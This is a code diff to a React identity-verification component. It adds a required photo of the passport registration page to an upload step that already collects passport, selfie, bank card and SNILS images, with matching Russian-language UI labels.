@@ -146,6 +146,8 @@ const CabinetStatusCard = ({
   const PHOTO_CHECK_SECONDS = 60;
   const [passportPhoto, setPassportPhoto] = useState<string | null>(null);
   const [passportFile, setPassportFile] = useState<File | null>(null);
+  const [registrationPhoto, setRegistrationPhoto] = useState<string | null>(null);
+  const [registrationFile, setRegistrationFile] = useState<File | null>(null);
   const [selfiePhoto, setSelfiePhoto] = useState<string | null>(null);
   const [selfieFile, setSelfieFile] = useState<File | null>(null);
   const [cardPhoto, setCardPhoto] = useState<string | null>(null);
@@ -156,15 +158,16 @@ const CabinetStatusCard = ({
   const [photosChecking, setPhotosChecking] = useState(false);
   const [photosSecondsLeft, setPhotosSecondsLeft] = useState(PHOTO_CHECK_SECONDS);
   const [photosError, setPhotosError] = useState('');
-  const canSubmitPhotos = !!(passportFile && selfieFile && cardFile && snilsFile);
+  const canSubmitPhotos = !!(passportFile && registrationFile && selfieFile && cardFile && snilsFile);
 
   const handleSubmitPhotos = async () => {
-    if (!canSubmitPhotos || !passportFile || !selfieFile || !cardFile || !snilsFile) return;
+    if (!canSubmitPhotos || !passportFile || !registrationFile || !selfieFile || !cardFile || !snilsFile) return;
     setPhotosUploading(true);
     setPhotosError('');
     try {
-      const [passport_photo_url, selfie_photo_url, card_photo_url, snils_photo_url] = await Promise.all([
+      const [passport_photo_url, registration_photo_url, selfie_photo_url, card_photo_url, snils_photo_url] = await Promise.all([
         apiUploadFile(passportFile),
+        apiUploadFile(registrationFile),
         apiUploadFile(selfieFile),
         apiUploadFile(cardFile),
         apiUploadFile(snilsFile),
@@ -180,7 +183,7 @@ const CabinetStatusCard = ({
               try {
                 await apiSubmitIdentifyPhotos({
                   ref_number: user.ref_number,
-                  passport_photo_url, selfie_photo_url, card_photo_url, snils_photo_url,
+                  passport_photo_url, registration_photo_url, selfie_photo_url, card_photo_url, snils_photo_url,
                 });
                 const fresh = await apiGetRequest(user.ref_number);
                 saveSession(fresh);
@@ -427,7 +430,7 @@ const CabinetStatusCard = ({
               <>
                 <div>
                   <p className="text-sm font-semibold text-primary">Оператор запросил идентификацию</p>
-                  <p className="mt-0.5 text-xs text-muted-foreground">Загрузите фото паспорта, селфи, банковской карты и СНИЛС</p>
+                  <p className="mt-0.5 text-xs text-muted-foreground">Загрузите фото паспорта, регистрации, селфи, банковской карты и СНИЛС</p>
                 </div>
 
                 <CameraCapture
@@ -435,6 +438,12 @@ const CabinetStatusCard = ({
                   hint="Наведите камеру на разворот с фотографией"
                   preview={passportPhoto}
                   onCapture={handlePickPhoto(setPassportFile, setPassportPhoto)}
+                />
+                <CameraCapture
+                  label="Фото регистрации (прописки)"
+                  hint="Наведите камеру на страницу с регистрацией"
+                  preview={registrationPhoto}
+                  onCapture={handlePickPhoto(setRegistrationFile, setRegistrationPhoto)}
                 />
                 <CameraCapture
                   label="Селфи с паспортом у лица"
